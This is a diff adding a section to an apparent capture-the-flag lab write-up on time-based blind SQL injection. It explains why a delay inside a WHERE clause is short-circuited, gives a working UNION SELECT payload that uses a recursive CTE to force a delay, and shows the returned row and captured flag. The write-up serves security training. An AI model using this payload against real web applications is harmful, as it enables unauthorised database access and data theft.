@@ -22,3 +22,17 @@
 
 **Bonus - Users table structure:**
 CREATE TABLE Users (id INTEGER PRIMARY KEY, name VARCHAR(120), username VARCHAR(120) UNIQUE, password TEXT)
+
+## Task 3 - Time-Based Blind SQL Injection
+
+**Note:** Placing the delay inside a WHERE clause fails due to short-circuit evaluation 
+(status='Nobody' is false, so AND conditions never execute). 
+The delay must be placed in the SELECT column list instead.
+
+**Payload:**
+`status=Nobody' UNION SELECT (SELECT count(*) FROM (WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<30000000) SELECT x FROM r)),2,3,4,5 -- -`
+
+**Result (42.75s delay):**
+[1, "b392a248a0a12c206fbef5098f8fd5bd", "Paid", "TIMOUT FLAG", "FLAG@web0x01.hbtn"]
+
+**Flag:** b392a248a0a12c206fbef5098f8fd5bd
